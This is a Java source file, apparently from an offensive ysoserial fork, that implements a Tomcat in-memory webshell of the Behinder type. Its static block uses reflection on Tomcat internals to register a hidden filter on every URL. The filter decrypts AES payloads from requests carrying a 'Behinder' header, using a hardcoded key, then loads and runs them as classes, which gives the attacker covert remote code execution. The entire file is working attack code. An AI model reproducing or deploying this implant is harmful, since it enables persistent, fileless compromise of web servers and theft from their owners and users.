package ysoserial.bullet.tmpl.memshell.tomcat;

import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

/**
 * @author wh1t3p1g
 * @since 2023/3/1
 */
public class TomcatFilterBehinder implements Filter {

    private static String uri = "/*";
    private static String filterName = "DefaultFilter";

    static  {
        try{
            System.out.println("try to inject");
            ThreadLocal threadLocal = init();

            if (threadLocal != null && threadLocal.get() != null) {
                System.out.println("try to inject to request");
                ServletRequest servletRequest = (ServletRequest) threadLocal.get();
                ServletContext servletContext = servletRequest.getServletContext();

                ApplicationContext applicationContext = (ApplicationContext) getFieldObject(servletContext, servletContext.getClass(), "context");

                StandardContext standardContext = (StandardContext) getFieldObject(applicationContext, applicationContext.getClass(), "context");
                Map filterConfigs = (Map) getFieldObject(standardContext, standardContext.getClass(), "filterConfigs");

                if(filterConfigs.get(filterName) != null){
                    filterConfigs.remove(filterName); // 重新注册
                }

                TomcatFilterBehinder filter = new TomcatFilterBehinder();

                FilterDef filterDef = new FilterDef();
                filterDef.setFilterName(filterName);
                filterDef.setFilterClass(filter.getClass().getName());
                filterDef.setFilter(filter);
                standardContext.addFilterDef(filterDef);

                FilterMap filterMap = new FilterMap();
                filterMap.addURLPattern(uri);
                filterMap.setFilterName(filterName);
                filterMap.setDispatcher(DispatcherType.REQUEST.name());
                standardContext.addFilterMapBefore(filterMap);

                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
                constructor.setAccessible(true);
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

                filterConfigs.put(filterName, filterConfig);
                System.out.println("inject success");
            }

        }catch (Exception e){

        }
    }

    public static ThreadLocal init() throws Exception{
        Class<?> applicationDispatcher = Class.forName("org.apache.catalina.core.ApplicationDispatcher");
        Field WRAP_SAME_OBJECT = getField(applicationDispatcher, "WRAP_SAME_OBJECT");
        Field modifiersField = getField(WRAP_SAME_OBJECT.getClass(), "modifiers");
        modifiersField.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
        if (!WRAP_SAME_OBJECT.getBoolean(null)) {
            WRAP_SAME_OBJECT.setBoolean(null, true);
        }

        //初始化 lastServicedRequest
        Class<?> applicationFilterChain = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
        Field lastServicedRequest = getField(applicationFilterChain,"lastServicedRequest");
        modifiersField = getField(lastServicedRequest.getClass(),"modifiers");
        modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() & ~java.lang.reflect.Modifier.FINAL);

        if (lastServicedRequest.get(null) == null) {
            lastServicedRequest.set(null, new ThreadLocal());
        }

        //初始化 lastServicedResponse
        Field lastServicedResponse = getField(applicationFilterChain,"lastServicedResponse");
        modifiersField = getField(lastServicedResponse.getClass(),"modifiers");
        modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() & ~java.lang.reflect.Modifier.FINAL);

        if (lastServicedResponse.get(null) == null) {
            lastServicedResponse.set(null, new ThreadLocal());
        }

        return (ThreadLocal) getFieldObject(null, applicationFilterChain,"lastServicedRequest");
    }

    public static Object getFieldObject(Object obj, Class<?> cls, String fieldName){
        Field field = getField(cls, fieldName);
        try {
            return field.get(obj);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
        return null;
    }

    public static Field getField(Class<?> cls, String fieldName){
        Field field = null;
        try {
            field = cls.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (cls.getSuperclass() != null)
                field = getField(cls.getSuperclass(), fieldName);
        }
        return field;
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        try {
            HttpServletRequest req = (HttpServletRequest) request;
            HttpServletResponse resp = (HttpServletResponse) response;
            if (req.getHeader("Behinder") != null) {
                HttpSession session = req.getSession();

                HashMap pageContext = new HashMap();
                pageContext.put("request", req);
                pageContext.put("response", resp);
                pageContext.put("session", session);

                String k = "7c9128fbb5c8aa67";
                session.putValue("u", k);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                byte[] data = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(req.getReader().readLine()));
                Method m = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                m.setAccessible(true);
                Class clazz = (Class) m.invoke(Thread.currentThread().getContextClassLoader(), data, 0, data.length);
                clazz.newInstance().equals(pageContext);
                return;
            }
        } catch (Exception e) {}
        chain.doFilter(request, response);
    }

    @Override
    public void destroy() {

    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

}

